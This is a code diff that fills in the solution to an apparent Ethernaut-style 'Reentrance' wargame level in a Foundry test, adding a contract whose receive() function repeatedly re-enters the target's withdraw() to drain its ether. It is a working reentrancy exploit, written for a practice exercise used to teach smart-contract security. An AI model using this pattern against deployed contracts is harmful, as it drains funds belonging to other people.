@@ -17,5 +17,34 @@ contract ReentranceLevel is SetUpLevelTest {
         reentrance = Reentrance(payable(instance));
 
         /** CODE YOUR SOLUTION HERE */
+        vm.startPrank(player);
+        ReentranceAttack reAttack = new ReentranceAttack(
+            payable(address(reentrance))
+        );
+        reAttack.denoteAndWithdraw{value: 0.001 ether}();
+        vm.stopPrank();
+    }
+}
+
+contract ReentranceAttack {
+    Reentrance re;
+
+    constructor(address payable _target) {
+        re = Reentrance(_target);
+    }
+
+    function denoteAndWithdraw() public payable {
+        re.donate{value: msg.value}(address(this));
+        re.withdraw(msg.value);
+        (bool success, ) = payable(msg.sender).call{
+            value: address(this).balance
+        }("");
+        assert(success);
+    }
+
+    receive() external payable {
+        if (address(re).balance >= msg.value) {
+            re.withdraw(msg.value);
+        }
     }
 }
